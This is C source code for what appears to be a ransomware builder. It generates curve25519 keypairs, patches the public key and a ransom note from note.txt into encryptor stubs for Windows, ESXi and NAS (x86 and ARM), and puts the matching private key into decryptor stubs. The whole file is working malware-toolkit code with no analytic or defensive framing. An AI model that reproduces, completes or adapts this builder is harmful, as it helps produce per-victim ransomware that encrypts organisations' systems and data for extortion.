#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include "curve25519-donna.h"

const uint8_t basepoint[32] = { 9 };

char pth_e[MAX_PATH + 1];
char pth_d[MAX_PATH + 1];
char pth_kp[MAX_PATH + 1];
char pth_ks[MAX_PATH + 1];

BYTE k_public[32];
BYTE k_private[32];

BYTE* find_needle(BYTE* haystack, size_t haystack_length, BYTE* needle, size_t needle_length) {
	for (size_t haystack_index = 0; haystack_index < haystack_length; haystack_index++) {

		bool needle_found = true;
		for (size_t needle_index = 0; needle_index < needle_length; needle_index++) {
			BYTE haystack_character = haystack[haystack_index + needle_index];
			BYTE needle_character = needle[needle_index];
			if (haystack_character == needle_character) {
				continue;
			}
			else {
				needle_found = false;
				break;
			}
		}

		if (needle_found) {
			return &haystack[haystack_index];
		}
	}

	return nullptr;
}

void writeK() {
	DWORD dw = 0;
	HANDLE hKey = CreateFileA(pth_kp, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hKey != INVALID_HANDLE_VALUE) {
		WriteFile(hKey, k_public, 32, &dw, 0);
		CloseHandle(hKey);
	}
	else {
		printf("Can't open %s, bye!\n", pth_kp);
		ExitProcess(0);
	}
	hKey = CreateFileA(pth_ks, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hKey != INVALID_HANDLE_VALUE) {
		WriteFile(hKey, k_private, 32, &dw, 0);
		CloseHandle(hKey);
	}
	else {
		printf("Can't open %s, bye!\n", pth_ks);
		ExitProcess(0);
	}

	printf("\"%s\" written!\n", pth_kp);
	printf("\"%s\" written!\n", pth_ks);
}

void writeD(LPCSTR in, LPCSTR out) {
	DWORD dw;
	DWORD dwSize;
	HANDLE hStub = CreateFileA(in, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	HANDLE hUnlock = CreateFileA(out, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
	if (hStub == INVALID_HANDLE_VALUE) {
		printf("Can't open handle for e.bin, bye!\n");
		ExitProcess(0);
	}
	if (hUnlock == INVALID_HANDLE_VALUE) {
		printf("Can't open handle for %s, bye!\n", out);
		ExitProcess(0);
	}

	BYTE* mem = (BYTE*)malloc(dwSize = GetFileSize(hStub, 0));

	ReadFile(hStub, mem, dwSize, &dw, 0);

	BYTE* curvOffset = find_needle(mem, dwSize, (BYTE*)"curvpattern", 11);

	memcpy(curvOffset, k_private, 32);

	WriteFile(hUnlock, mem, dwSize, &dw, 0);

	CloseHandle(hStub);
	CloseHandle(hUnlock);

	printf("\"%s\" written!\n", out);
}

void writeE(LPCSTR in, LPCSTR out) {
	DWORD dwNoteLen = 0;
	BYTE bNoteData[8192];
	memset(bNoteData, 0, 8192);

	DWORD dw = 0;
	DWORD dwSize = 0;
	HANDLE hNote = CreateFileA("note.txt", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hNote != INVALID_HANDLE_VALUE) {
		if (GetFileSize(hNote, 0) <= 8192) {
			ReadFile(hNote, bNoteData, 8192, &dwNoteLen, 0);

			HANDLE hStub = CreateFileA(in, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			HANDLE hLock = CreateFileA(out, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
			if (hStub == INVALID_HANDLE_VALUE) {
				printf("Can't open handle for e.bin, bye!\n");
				ExitProcess(0);
			}
			if (hLock == INVALID_HANDLE_VALUE) {
				printf("Can't open handle for %s, bye!\n", out);
				ExitProcess(0);
			}
			dwSize = GetFileSize(hStub, 0);

			BYTE* mem = (BYTE*)malloc(dwSize);
			ReadFile(hStub, mem, dwSize, &dw, 0);

			BYTE* noteOffset = find_needle(mem, dwSize, (BYTE*)"notepattern", 11);
			BYTE* curvOffset = find_needle(mem, dwSize, (BYTE*)"curvpattern", 11);

			noteOffset[dwNoteLen] = 0;
			memcpy(noteOffset, bNoteData, 8192);
			memcpy(curvOffset, k_public, 32);

			WriteFile(hLock, mem, dwSize, &dw, 0);

			CloseHandle(hStub);
			CloseHandle(hLock);
		}
		else {
			printf("note.txt can't be bigger than 8192 bytes, bye!\n");
			ExitProcess(0);
		}
		CloseHandle(hNote);
	}
	else {
		printf("Can't open note.txt, bye!\n");
		ExitProcess(0);
	}

	printf("\"%s\" written!\n", out);
}

void genK() {
	HCRYPTPROV hProv;

	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
		!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET)) hProv = NULL;
	if (hProv != 0) {
		CryptGenRandom(hProv, 32, k_private);
		k_private[0] &= 248;
		k_private[31] &= 127;
		k_private[31] |= 64;
		curve25519_donna(k_public, k_private, basepoint);

		printf("curve25519 keys generated.\n");
	}
	else {
		printf("Can't initialize HCRYPTPROV, bye!\n");
		ExitProcess(0);
	}
}

int main(int argc, char* argv[]) {
	if (argc == 2 || argc == 3) {
		printf("Creating folder '%s'\n", argv[1]);
		CreateDirectoryA(argv[1], 0);

		lstrcpyA(pth_kp, argv[1]);
		lstrcpyA(pth_ks, argv[1]);
		lstrcatA(pth_kp, "\\kp.curve25519");
		lstrcatA(pth_ks, "\\ks.curve25519");

		if (argc == 2) {
			genK();
		}
		else {
			DWORD dw;
			HANDLE hPrivKFile = CreateFileA(argv[2], GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
			if (hPrivKFile != INVALID_HANDLE_VALUE) {
				ReadFile(hPrivKFile, k_private, 32, &dw, 0);
				curve25519_donna(k_public, k_private, basepoint);
				CloseHandle(hPrivKFile);
			}
			else {
				printf("Can't open keyfile '%s'\n", argv[2]);
				return 0;
			}
		}

		lstrcpyA(pth_e, argv[1]);
		lstrcatA(pth_e, "\\e_win.exe");
		writeE("e_win.bin", pth_e);

		lstrcpyA(pth_d, argv[1]);
		lstrcatA(pth_d, "\\d_win.exe");
		writeD("d_win.bin", pth_d);

		lstrcpyA(pth_e, argv[1]);
		lstrcatA(pth_e, "\\e_esxi.out");
		writeE("e_esxi.out", pth_e);

		lstrcpyA(pth_d, argv[1]);
		lstrcatA(pth_d, "\\d_esxi.out");
		writeD("d_esxi.out", pth_d);

		lstrcpyA(pth_e, argv[1]);
		lstrcatA(pth_e, "\\e_nas_x86.out");
		writeE("e_nas_x86.out", pth_e);

		lstrcpyA(pth_d, argv[1]);
		lstrcatA(pth_d, "\\d_nas_x86.out");
		writeD("d_nas_x86.out", pth_d);

		lstrcpyA(pth_e, argv[1]);
		lstrcatA(pth_e, "\\e_nas_arm.out");
		writeE("e_nas_arm.out", pth_e);

		lstrcpyA(pth_d, argv[1]);
		lstrcatA(pth_d, "\\d_nas_arm.out");
		writeD("d_nas_arm.out", pth_d);


		writeK();
		system("pause");
	}
	else {
		printf("Usage: builder.exe FolderName\n");
	}
}